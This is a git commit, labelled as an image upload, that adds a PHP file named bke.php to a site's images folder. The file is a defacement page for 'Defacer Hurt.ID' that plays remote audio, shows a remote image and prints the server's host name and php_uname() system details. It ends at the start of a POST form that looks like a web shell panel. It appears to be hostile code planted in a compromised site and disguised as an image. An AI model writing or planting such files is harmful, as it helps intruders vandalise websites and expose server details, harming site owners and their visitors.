c810ae1056aabcfed3ead2802a48269650ffc0ce
odzreshop <odzreshop@gmail.com>
2025-12-30 01:03:39 +0800

    Upload image bke.php

---
+++ images/bke.php
@@ -0,0 +1,57 @@
+<?php
+session_start();
+date_default_timezone_set("Asia/Jakarta");
+?>
+
+<from>
+<body bgcolor="#000000">
+<center>
+<br><br><br><br>
+<br><br><br>
+<img src="https://jurnal.uinsyahada.ac.id/Hurt/sadme.jpeg" border="0" width="400" height="400">
+<br>
+<font size="100" color="white" face="tahoma">Defacer    <font color="red"> Hurt.ID</font>
+<br><br>
+<center>
+<audio autoplay="autoplay" controls="controls" src="https://d.top4top.io/m_295845qgw0.mp3" type="audio/mpeg">
+</audio>
+</a>
+</center>
+<br>
+</body>
+</from>
+
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<meta name="description" content="Defacer Hurt.id">
+<meta name="author" content="Defacer Hurt">
+<meta name="copyright" content="Defacer Hurt.id">
+<meta name="keyword" content="Defacer Hurt.id">
+<meta name="rating" content="general">
+<meta name="googlebot" content="all, index, follow">
+<meta name="robots" content="index, follow">
+<meta name="googlebot-news" content="all">
+<meta name="title" content="Defacer Hurt.id">
+<meta property="description" content="Defacer Hurt.id">
+<meta property="og:image" content="https://jurnal.uinsyahada.ac.id/Hurt/sadme.jpeg">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="Atribut/all.min.css">
+<link rel="shortcut icon" href="https://jurnal.uinsyahada.ac.id/Hurt/sadme.jpeg">
+<title>
+<?=$_SERVER['HTTP_HOST'];?> Defacer Hurt.id</title>
+</head>
+<body class="bg-secondary text-light">
+<div class="container-fluid">
+<div class="py-3" id="main">
+<div class="box shadow bg-dark p-4 rounded-3">
+<form method="post">
+<marquee direction="left">
+<i class="bi bi-display"></i>&nbsp;&nbsp;<u><?=php_uname();?></u>
+</marquee>
+</html>
+
+
+	
+	
